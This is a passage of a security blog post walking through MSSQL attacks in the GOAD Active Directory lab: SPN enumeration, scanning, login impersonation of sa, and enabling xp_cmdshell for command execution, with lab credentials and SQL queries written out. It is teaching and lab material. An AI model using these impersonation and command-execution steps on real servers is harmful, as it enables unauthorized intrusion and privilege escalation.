<!DOCTYPE html><html lang="fr" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="GOAD - part 7 - MSSQL" /><meta property="og:locale" content="fr" /><meta name="description" content="In the previous post (Goad pwning part6) we tried some attacks with ADCS activated on the domain. Now let’s take a step back, and go back on the castelblack.north.sevenkingdoms.local to take a look at the MSSQL server." /><meta property="og:description" content="In the previous post (Goad pwning part6) we tried some attacks with ADCS activated on the domain. Now let’s take a step back, and go back on the castelblack.north.sevenkingdoms.local to take a look at the MSSQL server." /><link rel="canonical" href="https://mayfly277.github.io/posts/GOADv2-pwning-part7/" /><meta property="og:url" content="https://mayfly277.github.io/posts/GOADv2-pwning-part7/" /><meta property="og:site_name" content="Mayfly" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-12T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="GOAD - part 7 - MSSQL" /><meta name="twitter:site" content="@M4yFly" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"In the previous post (Goad pwning part6) we tried some attacks with ADCS activated on the domain. Now let’s take a step back, and go back on the castelblack.north.sevenkingdoms.local to take a look at the MSSQL server.","url":"https://mayfly277.github.io/posts/GOADv2-pwning-part7/","@type":"BlogPosting","headline":"GOAD - part 7 - MSSQL","dateModified":"2022-10-22T10:56:54+02:00","datePublished":"2022-09-12T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mayfly277.github.io/posts/GOADv2-pwning-part7/"},"@context":"https://schema.org"}</script><title>GOAD - part 7 - MSSQL | Mayfly</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mayfly"><meta name="application-name" content="Mayfly"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/mayfly.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Mayfly</a></div><div class="site-subtitle font-italic">Hack, Code, Sleep, Repeat</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/mayfly277" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/M4yFly" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['mayfly277','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="https://www.root-me.org/mayfly" aria-label="rootme" class="order-6" target="_blank" rel="noopener"> <i class="fas fa-skull"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-7" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>GOAD - part 7 - MSSQL</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>GOAD - part 7 - MSSQL</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> mayfly </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Sep 12, 2022, 12:00 AM +0200" >Sep 12<i class="unloaded">2022-09-12T00:00:00+02:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Oct 22, 2022, 10:56 AM +0200" >Oct 22<i class="unloaded">2022-10-22T10:56:54+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1590 words">8 min read</span></div></div><div class="post-content"><p>In the previous post (<a href="/posts/GOADv2-pwning-part6/">Goad pwning part6</a>) we tried some attacks with ADCS activated on the domain. Now let’s take a step back, and go back on the castelblack.north.sevenkingdoms.local to take a look at the MSSQL server.</p><p>Before jump into this chapter, i have done some small configuration on the lab, to be sure you get it, you should pull the updates and play : <code class="language-plaintext highlighter-rouge">ansible-playbook servers.yml</code> to get the last mssql configuration.</p><ul><li>This modifications are:<ul><li>arya.stark execute as user dbo impersonate privilege on msdb<li>brandon.stark impersonate on jon.snow</ul></ul><h2 id="enumerate-the-mssql-servers">Enumerate the MSSQL servers</h2><h3 id="impacket-getuserspnspy">Impacket GetUserSPNs.py</h3><ul><li>First let’s try to figure out the users with an SPN on an MSSQL server</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>GetUserSPNs.py north.sevenkingdoms.local/brandon.stark:iseedeadpeople
</pre></table></code></div></div><ul><li>And on essos domain</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>GetUserSPNs.py <span class="nt">-target-domain</span> essos.local north.sevenkingdoms.local/brandon.stark:iseedeadpeople
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_getuserspn.png" alt="mssql_getuserspn.png" /></p><h3 id="nmap">Nmap</h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p</span> 1433 <span class="nt">-sV</span> <span class="nt">-sC</span> 192.168.56.10-23
</pre></table></code></div></div><p>Two servers answer :</p><ul><li>castelblack.north.sevenkingdoms.local</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_nmap_castelblack.png" alt="mssql_nmap_castelblack.png" /></p><ul><li>braavos.essos.local : the result is identical as castelblack.</ul><h3 id="crackmapexec">CrackMapExec</h3><ul><li>Let’s try with crackmapexec</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./cme mssql 192.168.56.22-23
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_cme.png" alt="mssql_cme.png" /></p><ul><li>Now we could try with the user samwell.tarly</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./cme mssql 192.168.56.22 <span class="nt">-u</span> samwell.tarly <span class="nt">-p</span> Heartsbane <span class="nt">-d</span> north.sevenkingdoms.local
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_cme_samwell.png" alt="mssql_cme_samwell.png" /></p><ul><li>As we can see we got an access to the database</ul><h3 id="impacket">Impacket</h3><ul><li>To enumerate and use impacket mssql, i made a modified version of the example mssqlclient.py.<li><p>You can find the version <a href="https://github.com/SecureAuthCorp/impacket/pull/1397">here</a></p><li>The install is just like what we done in part5 merge the PR on your local impacket project and relaunch install:</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nb">cd</span> /opt/tools
git clone https://github.com/SecureAuthCorp/impacket myimpacket
<span class="nb">cd </span>myimpacket
python3 <span class="nt">-m</span> virtualenv myimpacket
<span class="nb">source </span>myimpacket/bin/activate
git fetch origin pull/1397/head:1397
git merge 1397
python3 <span class="nt">-m</span> pip <span class="nb">install</span> <span class="nb">.</span>
</pre></table></code></div></div><ul><li>We connect to the mssql server with the following command :</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 mssqlclient.py <span class="nt">-windows-auth</span> north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local
</pre></table></code></div></div><ul><li>And type help:<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>   lcd {path}                 - changes the current local directory to {path}
   exit                       - terminates the server process (and this session)
   enable_xp_cmdshell         - you know what it means
   disable_xp_cmdshell        - you know what it means
   enum_db                    - enum databases
   enum_links                 - enum linked servers
   enum_impersonate           - check logins that can be impersonate
   enum_logins                - enum login users
   enum_users                 - enum current db users
   enum_owner                 - enum db owner
   exec_as_user {user}        - impersonate with execute as user
   exec_as_login {login}      - impersonate with execute as login
   xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
   xp_dirtree {path}          - executes xp_dirtree on the path
   sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
   use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
   ! {cmd}                    - executes a local shell cmd
   show_query                 - show query
   mask_query                 - mask query
</pre></table></code></div></div><li><p>I added some new entries to the database : enum_db/enum_links/enum_impersonate/enum_login/enum_owner/exec_as_user/exec_as_login/use_link/show_query/mask_query</p><li>Let’s start the enumeration :</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum_logins
</pre></table></code></div></div><ul><li>This launch the following query (roles value meaning can be show <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-principals-transact-sql?view=sql-server-ver16">here</a>)</ul><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">select</span> <span class="n">r</span><span class="p">.</span><span class="n">name</span><span class="p">,</span><span class="n">r</span><span class="p">.</span><span class="n">type_desc</span><span class="p">,</span><span class="n">r</span><span class="p">.</span><span class="n">is_disabled</span><span class="p">,</span> <span class="n">sl</span><span class="p">.</span><span class="n">sysadmin</span><span class="p">,</span> <span class="n">sl</span><span class="p">.</span><span class="n">securityadmin</span><span class="p">,</span> 
<span class="n">sl</span><span class="p">.</span><span class="n">serveradmin</span><span class="p">,</span> <span class="n">sl</span><span class="p">.</span><span class="n">setupadmin</span><span class="p">,</span> <span class="n">sl</span><span class="p">.</span><span class="n">processadmin</span><span class="p">,</span> <span class="n">sl</span><span class="p">.</span><span class="n">diskadmin</span><span class="p">,</span> <span class="n">sl</span><span class="p">.</span><span class="n">dbcreator</span><span class="p">,</span> <span class="n">sl</span><span class="p">.</span><span class="n">bulkadmin</span> 
<span class="k">from</span>  <span class="n">master</span><span class="p">.</span><span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="n">r</span> 
<span class="k">left</span> <span class="k">join</span> <span class="n">master</span><span class="p">.</span><span class="n">sys</span><span class="p">.</span><span class="n">syslogins</span> <span class="n">sl</span> <span class="k">on</span> <span class="n">sl</span><span class="p">.</span><span class="n">sid</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">sid</span> 
<span class="k">where</span> <span class="n">r</span><span class="p">.</span><span class="k">type</span> <span class="k">in</span> <span class="p">(</span><span class="s1">'S'</span><span class="p">,</span><span class="s1">'E'</span><span class="p">,</span><span class="s1">'X'</span><span class="p">,</span><span class="s1">'U'</span><span class="p">,</span><span class="s1">'G'</span><span class="p">)</span>
</pre></table></code></div></div><ul><li>We see only a basic view as we are a simple user <img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_enum_login_samwell.png" alt="mssql_enum_login_samwell.png" /></ul><h3 id="impersonate---execute-as-login">impersonate - execute as login</h3><ul><li>Let’s enumerate impersonation values:</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum_impersonate
</pre></table></code></div></div><ul><li>This launch the following queries:</ul><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="s1">'LOGIN'</span> <span class="k">as</span> <span class="s1">'execute as'</span><span class="p">,</span><span class="s1">''</span> <span class="k">AS</span> <span class="s1">'database'</span><span class="p">,</span> 
<span class="n">pe</span><span class="p">.</span><span class="n">permission_name</span><span class="p">,</span> <span class="n">pe</span><span class="p">.</span><span class="n">state_desc</span><span class="p">,</span><span class="n">pr</span><span class="p">.</span><span class="n">name</span> <span class="k">AS</span> <span class="s1">'grantee'</span><span class="p">,</span> <span class="n">pr2</span><span class="p">.</span><span class="n">name</span> <span class="k">AS</span> <span class="s1">'grantor'</span> 
<span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_permissions</span> <span class="n">pe</span> 
<span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="n">pr</span> <span class="k">ON</span> <span class="n">pe</span><span class="p">.</span><span class="n">grantee_principal_id</span> <span class="o">=</span> <span class="n">pr</span><span class="p">.</span><span class="n">principal_Id</span> 
<span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="n">pr2</span> <span class="k">ON</span> <span class="n">pe</span><span class="p">.</span><span class="n">grantor_principal_id</span> <span class="o">=</span> <span class="n">pr2</span><span class="p">.</span><span class="n">principal_Id</span> <span class="k">WHERE</span> <span class="n">pe</span><span class="p">.</span><span class="k">type</span> <span class="o">=</span> <span class="s1">'IM'</span>
</pre></table></code></div></div><ul><li><p>The previous command list all login with impersonation permission</p><li><p>This launch also the following command on each databases :</p></ul><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">use</span> <span class="o">&lt;</span><span class="n">db</span><span class="o">&gt;</span><span class="p">;</span>
<span class="k">SELECT</span> <span class="s1">'USER'</span> <span class="k">as</span> <span class="s1">'execute as'</span><span class="p">,</span> <span class="n">DB_NAME</span><span class="p">()</span> <span class="k">AS</span> <span class="s1">'database'</span><span class="p">,</span>
<span class="n">pe</span><span class="p">.</span><span class="n">permission_name</span><span class="p">,</span><span class="n">pe</span><span class="p">.</span><span class="n">state_desc</span><span class="p">,</span> <span class="n">pr</span><span class="p">.</span><span class="n">name</span> <span class="k">AS</span> <span class="s1">'grantee'</span><span class="p">,</span> <span class="n">pr2</span><span class="p">.</span><span class="n">name</span> <span class="k">AS</span> <span class="s1">'grantor'</span> 
<span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_permissions</span> <span class="n">pe</span> 
<span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_principals</span> <span class="n">pr</span> <span class="k">ON</span> <span class="n">pe</span><span class="p">.</span><span class="n">grantee_principal_id</span> <span class="o">=</span> <span class="n">pr</span><span class="p">.</span><span class="n">principal_Id</span> 
<span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_principals</span> <span class="n">pr2</span> <span class="k">ON</span> <span class="n">pe</span><span class="p">.</span><span class="n">grantor_principal_id</span> <span class="o">=</span> <span class="n">pr2</span><span class="p">.</span><span class="n">principal_Id</span> <span class="k">WHERE</span> <span class="n">pe</span><span class="p">.</span><span class="k">type</span> <span class="o">=</span> <span class="s1">'IM'</span>
</pre></table></code></div></div><ul><li>The previous command list all users with impersonation permission</ul><blockquote><p>What is the hell ? login and user, what is the difference ?</p><ul><li>A “Login” grants the principal entry into the <strong>SERVER</strong><li>A “User” grants a login entry into a single <strong>DATABASE</strong></ul></blockquote><ul><li>I found out an image who explain it well and also a very nice summary <a href="https://blog.sqlauthority.com/2019/05/21/sql-server-difference-between-login-vs-user-security-concepts/">here</a></ul><p><em>“SQL Login is for Authentication and SQL Server User is for Authorization. Authentication can decide if we have permissions to access the server or not and Authorization decides what are different operations we can do in a database. Login is created at the SQL Server instance level and User is created at the SQL Server database level. We can have multiple users from a different database connected to a single login to a server.”</em></p><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_login_vs_user.png" alt="mssql_login_vs_user.png" /></p><ul><li>Ok let see the result :</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_enum_impersonate_samwell.png" alt="mssql_enum_impersonate_samwell.png" /></p><ul><li>Ok samwell got login impersonation to the user sa.<li>So we can impersonate sa with <code class="language-plaintext highlighter-rouge">execute as login</code> and execute commands with xp_cmdshell</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>exec_as_login sa
enable_xp_cmdshell
xp_cmdshell whoami
</pre></table></code></div></div><ul><li>This launch the following commands:</ul><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">execute</span> <span class="k">as</span> <span class="n">login</span><span class="o">=</span><span class="s1">'sa'</span><span class="p">;</span>
<span class="k">exec</span> <span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span><span class="mi">1</span><span class="p">;</span><span class="n">RECONFIGURE</span><span class="p">;</span><span class="k">exec</span> <span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sp_configure</span> <span class="s1">'xp_cmdshell'</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span><span class="n">RECONFIGURE</span><span class="p">;</span>
<span class="k">exec</span> <span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span> <span class="s1">'whoami'</span>
</pre></table></code></div></div><ul><li>And we get a command execution !</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_impersonate_exec_samwell.png" alt="mssql_impersonate_exec_samwell.png" /></p><ul><li>Let’s continue our enumeration as login <strong>sa</strong> this time:</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum_logins
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_enum_login_sa.png" alt="mssql_enum_login_sa.png" /></p><ul><li><p>As we can see with sa login we see a lot more things. And we can see that jon.snow is sysadmin on the mssql server</p><li><p>Let’s see if there is others impersonation privileges:</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum_impersonate
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_impersonate_sa.png" alt="mssql_impersonate_sa.png" /></p><ul><li>As sysadmin user (sa), we can see all the information in the database and so the others users with impersonation privileges.<li>Another way to get in could be to access as brandon.stark and do <code class="language-plaintext highlighter-rouge">execute as login</code> on user jon.snow.</ul><h3 id="impersonate---execute-as-user">impersonate - execute as user</h3><ul><li>We launch a connection to the db as arya.stark :</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 mssqlclient.py <span class="nt">-windows-auth</span> north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local
</pre></table></code></div></div><ul><li>if we use master db and impersonate user dbo we can’t get a shell</ul><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">use</span> <span class="n">master</span>
<span class="k">execute</span> <span class="k">as</span> <span class="k">user</span> <span class="o">=</span> <span class="nv">"dbo"</span>
<span class="k">exec</span> <span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span> <span class="s1">'whoami'</span>
